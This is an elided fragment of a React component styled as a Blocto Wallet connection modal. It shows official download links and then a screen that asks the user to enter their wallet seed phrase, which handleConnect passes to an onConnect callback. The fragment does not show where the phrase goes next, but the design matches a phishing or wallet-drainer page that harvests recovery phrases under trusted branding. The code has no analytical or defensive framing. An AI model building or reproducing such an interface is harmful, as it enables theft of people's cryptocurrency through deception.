...
export default function BloctoWalletModal({ onClose, onConnect, onBack }) {
  ...
  const handleConnect = () => {
    ...
    if (!allValid) return;
    if (onConnect) onConnect('Blocto Wallet', seedWords.join(' '));
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>Blocto Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/Blocto-log.png" alt="Blocto Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Blocto Wallet lets you access crypto via browser extension, website, or mobile app. Use the official links below to open the latest Blocto experience.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Blocto Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chrome.google.com/webstore/detail/blocto-wallet/oeopbcgkkoapgobdbedcemjljbihmemj"
                    target="_blank"
                  ...
                  <a
                    href="https://apps.apple.com/us/app/blocto/id1524538657"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  <a
                    href="https://play.google.com/store/apps/details?id=app.blocto.wallet"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Blocto seed phrase to continue.
              </p>
